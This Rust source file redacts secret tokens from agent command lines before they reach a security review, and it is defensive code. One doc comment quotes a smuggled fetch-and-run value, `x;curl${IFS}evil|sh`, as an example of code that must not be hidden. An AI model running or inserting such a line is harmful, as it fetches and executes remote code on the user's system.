//! Taking secrets out of what an agent's entry starts before it becomes an
//! item's text: a command line is where a token is written when it is not
//! in a variable (`--api-key …`, a header for `curl`, a login in an
//! address). Only two kinds are taken out: the value of a secret-named
//! assignment, flag or `Authorization` header, and an address's login.
//! What is taken out is hidden from the local rules and the AI alike, and a
//! payload hidden in it would go unread, so only what can be nothing but a
//! value is: a run of token characters (see `is_token_shaped`), never a word
//! with a shell character in it, never a path or an expansion (`$TOKEN`),
//! which are what a review needs to see.
//!
//! A token is never told by its look (`"apiKeyHelper": "sk-ant-…"` is sent
//! as written): a word that looks like one may also be the package a runner
//! fetches, however the command spells it, a host, a path or a file name,
//! and masking anything that could name what runs would hide code from the
//! review. A leaked token is the lesser harm next to an unreviewed payload.
//!
//! Not covered, and sent as written: a secret in a header other than
//! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
//! after a flag named for authorization rather than a secret
//! (`--authorization v`), and a quoted value of several words.

use crate::sweep::judge::secrets::{REDACTED, is_secret_name, without_secrets};

/// What the word before asked of the next one.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Next {
    /// Nothing.
    Word,
    /// It is the value of a flag or header named for a secret.
    Value,
}

/// `line` with the secrets in it taken out, as `REDACTED`:
///
/// - who an address logs in as (`scheme://user:password@`, the whole of it);
/// - the value of an `Authorization:` header, after its scheme where it has
///   one (`Bearer`, `token`), and the word after `Bearer` or `Basic`;
/// - the value of `NAME=value` where a name before an `=` is named for a
///   secret (`GITHUB_TOKEN=x`, `--env=API_KEY=x`, `--token=x`);
/// - the word after a flag named for a secret (`--api-key x`);
/// - what the review's own removal takes out (`export API_KEY=…`).
///
/// Each only where it is token-shaped. The line is read word by word, as
/// blanks split it; quotes around a word stay where they are.
///
/// Nothing else is taken out, so an API key pasted anywhere else
/// (`"apiKeyHelper": "sk-ant-…"`, `echo sk-ant-…`) reaches the AI provider
/// as written. Masking can hide code: a word that looks like a key may also
/// be the package a runner fetches, a host, a path or a file name, and a
/// review that cannot see what runs is worse than a leaked key. Accepted by
/// the owner after a review found every by-look rule hid a package, host or
/// path under some spelling (`pnpm dlx`, `sh -c 'npx …'`, a mirror's host).
pub(super) fn redacted(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut next = Next::Word;
    let mut word_start = None;
    for (index, character) in line.char_indices() {
        match (character.is_whitespace(), word_start) {
            (true, Some(start)) => {
                out.push_str(&redacted_word(&line[start..index], &mut next));
                out.push(character);
                word_start = None;
            }
            (true, None) => out.push(character),
            (false, None) => word_start = Some(index),
            (false, Some(_)) => {}
        }
    }
    if let Some(start) = word_start {
        out.push_str(&redacted_word(&line[start..], &mut next));
    }
    // The review's own removal too, so what is shown and saved is what is
    // sent (`export API_KEY=…; cmd`).
    without_secrets(&out)
}

/// One word of a line, with what the word before asked of it.
fn redacted_word(word: &str, next: &mut Next) -> String {
    let quotes: &[char] = &['"', '\''];
    let core = word.trim_matches(quotes);
    if core.is_empty() {
        return word.to_string();
    }
    let at = word.len() - word.trim_start_matches(quotes).len();
    let (before, after) = (&word[..at], &word[at + core.len()..]);
    let asked = std::mem::replace(next, Next::Word);
    let lower = core.to_ascii_lowercase();
    let core = if matches!(lower.as_str(), "bearer" | "basic")
        || (asked == Next::Value && is_auth_scheme(&lower))
        || lower.ends_with("authorization:")
    {
        *next = Next::Value;
        core.to_string()
    } else if asked == Next::Value {
        value(core).to_string()
    } else if let Some((header, rest)) = lower
        .split_once("authorization:")
        .filter(|(_, rest)| !rest.is_empty())
    {
        let name_end = header.len() + "authorization:".len();
        if is_auth_scheme(rest) {
            *next = Next::Value;
            core.to_string()
        } else {
            format!("{}{}", &core[..name_end], value(&core[name_end..]))
        }
    } else {
        let core = without_login(core);
        if core.starts_with('-') && !core.contains('=') && is_secret_name(&core) {
            *next = Next::Value;
            core
        } else {
            without_assigned_secret(&core).unwrap_or(core)
        }
    };
    format!("{before}{core}{after}")
}

/// Whether `lower` is the scheme of an `Authorization` header, which says
/// what kind the value after it is (`Bearer x`, `token x`).
fn is_auth_scheme(lower: &str) -> bool {
    matches!(lower, "bearer" | "basic" | "token" | "digest")
}

/// Whether `word` can be nothing but a value: token characters only
/// (letters, digits and `._~%+=:/-_`), and not a path or an expansion.
/// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
/// code, and taking it out would hide it from the review.
fn is_token_shaped(word: &str) -> bool {
    !word.is_empty()
        && !word.starts_with(['$', '/', '~', '.'])
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._~%+=:/-_".contains(c))
}

/// `word` as the value of something named for a secret: taken out where it
/// is token-shaped, else as written.
fn value(word: &str) -> &str {
    if is_token_shaped(word) {
        REDACTED
    } else {
        word
    }
}

/// `word` with the value after the first name before an `=` that is named
/// for a secret taken out (`--env=API_KEY=x`); `None` where no such name
/// is in it.
fn without_assigned_secret(word: &str) -> Option<String> {
    let mut name_end = 0;
    for part in word.split('=') {
        let value_start = name_end + part.len() + 1;
        if value_start > word.len() {
            break;
        }
        if is_secret_name(part) {
            return Some(format!(
                "{}={}",
                &word[..value_start - 1],
                value(&word[value_start..])
            ));
        }
        name_end = value_start;
    }
    None
}

/// `word` with who each address in it logs in as taken out, where that is
/// token-shaped: `git+https://ghp_x@github.com/r` is
/// `git+https://github.com/r`.
pub(super) fn without_login(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    let mut rest = word;
    while let Some(at) = rest.find("://") {
        let (before, after) = rest.split_at(at + 3);
        out.push_str(before);
        let end = after
            .find(|c: char| matches!(c, '/' | '?' | '#' | '"' | '\'') || c.is_whitespace())
            .unwrap_or(after.len());
        let authority = &after[..end];
        out.push_str(
            authority
                .rsplit_once('@')
                .filter(|(login, _)| is_token_shaped(login))
                .map_or(authority, |(_, host)| host),
        );
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}
